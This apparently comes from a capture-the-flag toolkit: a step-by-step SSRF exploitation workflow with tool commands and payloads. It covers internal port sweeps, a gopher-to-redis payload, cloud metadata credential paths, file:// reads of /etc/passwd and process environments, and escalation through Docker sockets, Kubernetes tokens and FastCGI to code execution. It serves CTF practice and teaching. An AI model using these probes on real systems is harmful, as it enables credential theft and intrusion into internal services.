# Workflow — the ordered probe-sequence

The bounded path from "url-param exists" to "flag" — ordered by
information-gain-per-probe, with the falsifier that ends each
branch.

---

## Phase 0 — the ledger

```bash
python3 tools/state.py $C --category web --target "$BASE" \
  --challenge-name "$REAL" --event "$EVENT"
python3 tools/chain_match.py --record $C     # the red-island /
                                              # weather-app cards?
python3 tools/decide.py $C
```

## Phase 1 — confirm the fetch happens at all

```bash
# 1a. the own-host probe — prove the field is fetched
python3 tools/web/oob_listener.py serve --port 9000 &
python3 tools/web/oob_listener.py canary --base http://YOU:9000 --name p1
python3 tools/web/http_probe.py --challenge $C --class web-ssrf \
  --url "$BASE/fetch" --method POST --body "url=http://CANARY/" \
  --evidence-regex '.*' --evidence-kind class --on-match inconclusive
python3 tools/web/oob_listener.py hits        # the callback?
```

```text
CANARY-HIT     → the fetcher exists — the class is live — proceed
CANARY-SILENCE → egress-blocked OR not-a-fetch — try the internal
                 probe: url=http://127.0.0.1:1/ — a "refused" error
                 proves the fetcher dialled → class confirmed even
                 without egress — the INTERNAL-leg is the proof
```

**Falsifier**: no callback AND no fetch-error → the field isn't a
fetch → the class dies → `decide.py` names the next class.

## Phase 2 — read the fetcher — the UA and the channel

```text
the callback's User-Agent → the fetcher → the scheme-list:
   curl/x.y     → gopher/file/dict reachable
   python-*     → http(+file for urllib)
   Java         → jar/netdoc/file
   Go/okhttp    → http-only — parser-diff only
the response-echo? → body-echo vs error-echo vs status-only vs blind
```

## Phase 3 — the loopback probe — is 127 reachable?

```bash
python3 tools/web/http_probe.py --challenge $C --class web-ssrf \
  --url "$BASE/fetch" --method POST --body 'url=http://127.0.0.1:1/' \
  --evidence-regex 'refused|ECONNREFUSED' --evidence-kind class \
  --on-match confirms --on-miss inconclusive
```

```text
refused-error   → loopback dialled → internal-reach confirmed →
                  the port-sweep next
blocked-error   → "blocked"/"invalid"/"forbidden" → a FILTER —
                  the bypass-family from url-parsing.md — which
                  check: string, resolution, or fetch-time
timeout         → filtered/at-fwall or nonexistent — inconclusive
```

## Phase 4 — the internal-map — what answers

```bash
# the port-sweep — the bounded common-ports
python3 tools/web/ssrf_probe.py --url "$BASE/fetch" --param url \
  --ports 22,80,443,3000,5000,6379,8000,8009,8080,8086,8500,8888,9000,9200,11211,15672,2375,2379,27017 \
  --timeout 4
```

```text
each open-port → fingerprint → internal-services.md the chain:
  6379 redis → gopher_gen redis "EVAL" "return redis.call('get','flag')" 0
  9200 es    → http://127.0.0.1:9200/_all/_search?pretty
  2375 docker→ /containers/json
  <app-port> → /admin /flag /actuator/env
```

## Phase 5 — the metadata-leg — is it cloud?

```text
url=http://169.254.169.254/latest/meta-data/
   → response? aws-shape → the user-data + iam-creds paths
   → 403/header-needed → gcp/azure-shape → v1beta1 / Metadata-hdr
   → timeout → not-cloud → file-read instead
```

## Phase 6 — the file-leg — does file:// open?

```text
url=file:///etc/passwd   → passwd-echo → file-read open →
   file-read.md's path-map — /flag, /proc/self/environ,
   /proc/self/cwd/config, the app's source — read_loop over the
   flag-wordlist
```

## Phase 7 — the bypass-branch — when blocked

```text
blocked at validation → which check?
   - string-checks → url-parsing.md — the encoding/@/#/?/suffix
     family matching the check-shape — sanitizer_fuzz sweeps
     which forms pass
   - resolution-check → dns-rebind.md — the two-lookup gap
   - fetch-time-check → the input-IP is used → nothing to separate
     → pivot to redirect-chains or parser-diff
   - scheme-check → which schemes allowed → the scheme-table
     (file/gopher/dict/jar/netdoc/php-filter) — the non-http reach
```

## Phase 8 — the escalate-branch — when the read-channel is thin

```text
blind but writes?      → gopher→redis→SET + read-back — the
                          shared-state channel
writes-not-readable?    → file-write to a served-dir → fetch it —
                          the webroot-write
has-docker?             → socket → container-spawn → host-mount
has-k8s?                → SA-token → secrets
has-fastcgi?            → gopher→fcgi → auto_prepend → RCE
has-activemq/jenkins?   → the console's own RCE-features
nothing?                → the chain has no impact — park —
                          escalate — the next rung
```

## Phase 9 — the flag-verify

```bash
# the flag is real only when it passes the gate
python3 tools/hooks.py pre-flag $C --value "flag{...}" \
  --source "<the-response-it-came-from>"
```

## The ordered falsifiers — what ends each branch

```text
no fetch at all         → not-ssrf — the param isn't fetched —
                          switch-class
fetch but no internal   → egress-only or fetch-time-bound —
                          pivot to different class or rebind
internal + no channel   → pure-blind → the state-write escalation
                          or inconclusive-stop
file-blocked            → http-only fetcher → parser-diff the
                          http-reaches
gopher-blocked          → scheme-capped → http-internal-services
                          only — the REST-ish ones
all-internal-blocked    → whitelist-topology → the redirect/
                          parser-diff family — the last doors
```

## The budget-shape

```text
the 5-probe-per-mechanism rule applies per MECHANISM-CLASS:
  - the scheme-family is one class — the scheme-table is the
    family — don't spend 5 probes on file://-variants when the
    scheme itself is filtered — switch to gopher
  - the bypass-family is one class — the url-parsing.md set is
    the family — 5 bypasses-then-switch-mechanism (rebind/redirect/
    second-order) not a 6th bypass
  - the internal-service is one class — each service's chain is
    the mechanism — redis→es→docker are different classes of
    MECHANISM not different "probes" — the port-count doesn't
    count as probes — one fingerprint per open-port is cheap
```
